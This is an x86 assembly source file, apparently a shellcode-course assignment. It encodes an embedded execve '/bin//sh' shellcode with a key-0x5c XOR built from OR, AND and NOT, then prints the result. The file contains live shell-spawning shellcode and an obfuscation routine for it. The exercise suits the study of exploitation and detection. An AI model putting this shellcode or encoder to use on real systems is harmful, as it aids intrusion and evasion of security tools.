; SLAE-XXX
; assignemnt 4.1: create a custom encoding scheme like Insertion Encoder 
; originality: decomposed XOR in AND and NOT for encoding against a static one byte key 


%define key 0x5c 

global _start			

section .text
_start:


encoder:
	; get shellcode address in esi  
	mov esi,Shellcode
	xor ecx, ecx 
	; size of shellcode  
	mov cl,mlen  

encode:

	; a xor b  = (a or b) and (not(a and b))
	; al is one byte / 8 bits 
	; ( a or b )  
	xor eax,eax 
	mov byte al,byte[esi]
	or al,key
	; store in bl 
	mov bl,al
	; (a and b) stored in al  
	xor eax,eax 
	mov byte al,byte[esi]	
	and al,key
	; not (a and b) 
	not al 
	;  
	and bl,al 
	mov byte[esi],bl 

	inc esi 
	loop encode

; 	jmp short Shellcode

print_encoded: 

	; print 
	mov eax, 0x4
	mov ebx, 0x1
	mov ecx, Shellcode
	mov edx, mlen
	int 0x80


	; exit the program gracefully
	mov eax, 0x1
	mov ebx, 0x5
	int 0x80
	
section .data 
	Shellcode: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
	; \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 execve-stack code 
	mlen	equ  $-Shellcode
